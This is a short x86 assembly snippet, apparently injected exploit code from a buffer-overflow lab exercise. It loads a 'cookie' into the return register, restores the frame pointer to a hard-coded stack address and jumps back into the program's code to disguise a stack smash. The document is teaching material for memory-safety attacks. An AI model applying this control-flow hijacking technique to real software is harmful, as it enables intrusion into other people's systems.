mov  0x804d108, %eax    # move cookie to eax
mov  $0x55683570, %ebp  # restore ebp
push $0x8048dbe         # push next instruction addres 
ret
